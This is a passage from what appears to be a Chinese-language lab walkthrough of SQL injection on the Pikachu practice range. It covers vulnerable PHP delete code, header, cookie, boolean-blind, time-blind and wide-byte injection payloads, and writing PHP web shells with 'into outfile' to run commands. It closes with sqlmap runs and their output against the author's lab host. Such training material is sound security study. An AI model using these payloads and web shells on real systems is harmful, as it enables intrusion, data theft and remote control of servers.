class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s2">&#34;inc/config.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s2">&#34;inc/function.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s2">&#34;inc/mysql.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//插入转义
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$message</span><span class="o">=</span><span class="nx">escape</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;insert into message(content,time) values(&#39;</span><span class="si">$message</span><span class="s2">&#39;,now())&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_affected_rows</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;出现异常，提交失败！&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// if(array_key_exists(&#39;id&#39;, $_GET) &amp;&amp; is_numeric($_GET[&#39;id&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="c1">//没对传进来的id进行处理，导致DEL注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;delete from message where id=</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_affected_rows</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:sqli_del.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p style=&#39;color: red&#39;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="http-header注入">“http header”注入</h3>
<p>有些时候后台开发人员为了验证客户端头部信息（如cookie验证）或者通过http header获取客户端的一些信息（如useragent、accept字段等）会对客户端http header信息进行获取并使用SQL进行处理。此时如果没有足够的安全考虑则可能会导致基于http header的SQL注入漏洞</p>
<p>一个登录表单，用提示给的账号密码登录进去看看</p>
<p><img alt="img" src="./img/2022090-6.png"></p>
<p>可以看到后端很可能获取了我们的http header信息</p>
<p>抓个包看看</p>
<p><img alt="img" src="./img/2022091-4.png"></p>
<p><img alt="img" src="./img/2022092-1.png"></p>
<p>第一个POST请求是登录请求，所以第二个GET请求就有可能是用来获取http header信息用的</p>
<p>将User-Agent（其他也行，根据情况而定）修改成单引号引发报错试试</p>
<p><img alt="img" src="./img/2022093-2.png"></p>
<p>现在基本可以确定这里存在http header注入漏洞了</p>
<p>合理猜测数据库使用了<code>insert()</code>函数进行处理，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</span><span class="w">
</span></span></span></code></pre></div><p>扔到User-Agent里</p>
<p><img alt="img" src="./img/2022094.png"></p>
<p><strong>注入成功</strong></p>
<p>还有一种注入的可能性，就是针对cookie字段里的登录信息进行注入</p>
<p><img alt="img" src="./img/2022095-0.png"></p>
<p>对ant[uname]构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</span><span class="w">
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022095.png"></p>
<p><strong>注入成功</strong></p>
<h3 id="布尔盲注">布尔盲注</h3>
<p>在有些情况下，后台使用了错误消息屏蔽方法屏蔽了报错信息，此时我们无法在根据报错信息来进行注入判断，这种情况下的注入称为“盲注”</p>
<p>布尔盲注针对的主要症状</p>
<ul>
<li>没有报错信息</li>
<li>不管输入正确与否都只显示两种情况</li>
<li>在输入正确的情况下输入<code>and 1=1/and 1=2</code>可以判断</li>
</ul>
<p>来看看场景</p>
<p><img alt="img" src="./img/2022090.gif"></p>
<p>发现无论输入什么前端都只返回正确或错误，尝试输入之前的payload也不奏效</p>
<p>输入个存在的用户发现返回正常，在后面补个条件试试</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and 1=1 #
</span></span></span><span class="line"><span class="cl"><span class="s1">lili&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="o">#</span><span class="w">
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091.gif"></p>
<p>发现此时查询结果根据后面的逻辑式真假而变化，可以判定这是一个布尔盲注点</p>
<p>来尝试构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and length(database())&gt;8 #
</span></span></span><span class="line"><span class="cl"><span class="s1">lili&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">113</span><span class="w"> </span><span class="o">#</span><span class="w">
</span></span></span></code></pre></div><p>语法：<code>substr(string,pos,len)</code></p>
<ul>
<li><code>string</code>：指定要截取的字符串</li>
<li><code>pos</code>：从字符串的何处开始</li>
<li><code>len</code>：要截取的字符串长度</li>
</ul>
<p>这个payload原理是先用二分法筛选并根据后台返回的输入正确与否判断数据库名字长度，然后截取数据库名字符串并转成ASCII码并再次利用同样的手段来一个个判断字母从而锁定整个数据库名</p>
<ul>
<li><em>这样的方法非常麻烦，通常我们会使用脚本和工具（如SQLmap）来进行盲注</em></li>
</ul>
<p>这样一来我们就可以一步步筛取关键信息了，比如</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;</span><span class="k">database</span><span class="p">()</span><span class="s1">&#39; limit 0,1),1,1))&gt;113 #
</span></span></span></code></pre></div><h3 id="时间盲注">时间盲注</h3>
<p>如果说布尔盲注还能看到真或假的回显的话，那么时间盲注就是什么都看不到了</p>
<p>但办法总比困难多，世界上依旧有藏不住的东西——时间，我们可以通过判断后台执行的时间来确认注入</p>
<p>这次是一个真正油盐不进的输入框</p>
<p><img alt="img" src="./img/2022090-7.png"></p>
<p>但是我们来尝试一下这个payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and sleep(5)#
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091-5.png"></p>
<p>页面等待了整整5秒后端才有回应，说明<code>sleep()</code>被函数成功执行了，可以进行时间盲注</p>
<p>利用<code>sleep()</code>函数代替真假判断注入，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and if((substr(database(),1,1))=&#39;</span><span class="n">p</span><span class="s1">&#39;,sleep(5),null)#
</span></span></span></code></pre></div><p>语法：<code>if(a,b,c)</code></p>
<ul>
<li>若a为真则返回b</li>
<li>若a为假则返回c</li>
</ul>
<p>payload意为抽取数据库名做判断，若为真则延迟，若为假则不延迟</p>
<p><img alt="img" src="./img/2022091-5.png"></p>
<p>剩下的和布尔盲注一致，不再赘述</p>
<h3 id="通过sql注入进行服务器远程控制">通过SQL注入进行服务器远程控制</h3>
<p>一句话木马是一种短小精悍的木马客户端，隐蔽性好且功能强大，如</p>
<ul>
<li>PHP：<code>&lt;?php @eval($_POST['chopper']);?&gt;</code></li>
<li>ASP：<code>&lt;%eval request(&quot;chopper&quot;)%&gt;</code></li>
<li>ASP.NET：<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code></li>
</ul>
<p>通过SQL注入漏洞我们可以给服务器写入恶意代码，如</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;/var/www/html/1.txt&#34;</span><span class="w">
</span></span></span></code></pre></div><ul>
<li><code>into outfile</code>将<code>select</code>的结果写入到指定目录的1.txt中</li>
<li>在一些没有回显的注入中可以使用into outfile将结果写入到指定文件中然后访问获取结果</li>
</ul>
</li>
</ul>
<p>当然这样做是有前提条件的</p>
<ul>
<li>需要知道远程目录</li>
<li>需要远程目录有写入权限</li>
<li>需要数据库开启<code>secure_file_priv</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; union select &#34;&lt;?php @eval($_GET[&#39;</span><span class="n">test</span><span class="s1">&#39;])?&gt;&#34;,2 into outfile &#34;/var/www/html/1.php&#34; #
</span></span></span></code></pre></div><p>通过GET请求访问刚才写入的php文件并远程代码执行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="mf">1.</span><span class="nx">php</span><span class="o">?</span><span class="nx">test</span><span class="o">=</span><span class="nx">phpinfo</span><span class="p">();</span>
</span></span></code></pre></div><p>因为更改MySQL权限略麻烦，这里贴张网上的图代替</p>
<p><img alt="img" src="./img/2022090-8.png"></p>
<p>通过相似的操作也可以对服务器操作系统进行远程命令执行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; union select &#34;&lt;?php system($_GET[&#39;</span><span class="n">cmd</span><span class="s1">&#39;])?&gt;&#34;,2 into outfile &#34;/var/www/html/2.php&#34; #
</span></span></span></code></pre></div><p>访问文件传入命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="mf">2.</span><span class="nx">php</span><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">ifconfig</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022091-6.png"></p>
<p>服务器的网络配置就被打印出来了</p>
<p>此时我们还可以进一步利用工具（如中国菜刀、中国蚁剑等）来进行方便快捷的远程代码和命令执行</p>
<h3 id="sql-inject漏洞爆破">SQL inject漏洞爆破</h3>
<p>构造payload，让页面返回是否存在这个表</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; and exists(select * from a) #
</span></span></span></code></pre></div><p>返回报错</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">Table</span><span class="w"> </span><span class="s1">&#39;pikachu.a&#39;</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t exist
</span></span></span></code></pre></div><p>我们抓一下刚刚返回报错的这个包，设置变量，爆破表名</p>
<p><img alt="img" src="./img/2022092-2.png"></p>
<p>由于没找到合适的字典，这里只随便演示一下</p>
<p><img alt="img" src="./img/2022093-3.png"></p>
<p><strong>爆破成功</strong></p>
<h3 id="宽字节注入">宽字节注入</h3>
<p>有些后端开发人员会使用<code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string()</code>这类函数来对特殊字符进行转义</p>
<p>比如pikachu使用的就是<code>addslashes()</code>，这个函数会对<code>'</code>、<code>&quot;</code>、<code>\</code>、<code>NULL</code>用<code>\</code>进行转义</p>
<p>但是当数据库使用GBK编码时我们可以构造宽字节绕过转义</p>
<p>比如<code>\</code>的编码是<code>%5c</code>，我们使用<code>%df</code>将转义构造成<code>%df%5c</code>（繁体字“連”）来绕过对<code>'</code>的转义</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; or 1=1 #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022094-1.png"></p>
<p>出了些小差错，发现只能在BurpSuite里成功回显，原因不明</p>
<h3 id="sqlmap的使用入门">SQLmap的使用入门</h3>
<p>SQLmap是一个经典强大的基于python的开源SQL注入脚本</p>
<ul>
<li><em><a href="https://github.com/sqlmapproject/sqlmap">GitHub</a></em></li>
<li><em><a href="https://sqlmap.org/">官网</a></em></li>
</ul>
<p>以之前步骤麻烦的布尔盲注为例</p>
<p>先获取GET请求的URL</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2
</code></pre><p>使用SQLmap来测试是否存在SQL注入漏洞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&#34;http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sqlmap</span><span class="w"> </span><span class="n">identified</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">71</span><span class="w"> </span><span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">requests</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">---
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">Parameter</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="p">(</span><span class="k">GET</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="n">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="p">(</span><span class="n">query</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="mi">111</span><span class="s1">&#39; AND (SELECT 7425 FROM (SELECT(SLEEP(5)))xRcn) AND &#39;</span><span class="n">ZFlw</span><span class="s1">&#39;=&#39;</span><span class="n">ZFlw</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">AF</span><span class="o">%</span><span class="n">A2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Generic</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="k">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">columns</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="mi">111</span><span class="s1">&#39; UNION ALL SELECT NULL,CONCAT(0x717a627871,0x4b674d50556f73617967554c514d45494f4a41736662694376737a73644f5671726b6b5049794567,0x7170707171)-- -&amp;submit=%E6%9F%A5%E8%AF%A2
</span></span></span><span class="line"><span class="cl"><span class="s1">---
</span></span></span></code></pre></div><p>可以看到SQLmap测试到一个SQL注入漏洞，参数是name，请求方式是GET，使用了union查询并给出payload</p>
<p>然后来获取数据库名</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python sqlmap.py -u <span class="s2">&#34;http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&#34;</span> --current-db
</span></span></code></pre></div><p>这样就获取到了数据库名pikachu，附带获取到MySQL版本、Web服务器应用版本和操作系统信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">sqlmap</span><span class="w"> </span><span class="n">resumed</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="k">session</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">---
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">Parameter</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="p">(</span><span class="k">GET</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="n">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="p">(</span><span class="n">query</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="mi">111</span><span class="s1">&#39; AND (SELECT 7425 FROM (SELECT(SLEEP(5)))xRcn) AND &#39;</span><span class="n">ZFlw</span><span class="s1">&#39;=&#39;</span><span class="n">ZFlw</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">AF</span><span class="o">%</span><span class="n">A2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w">
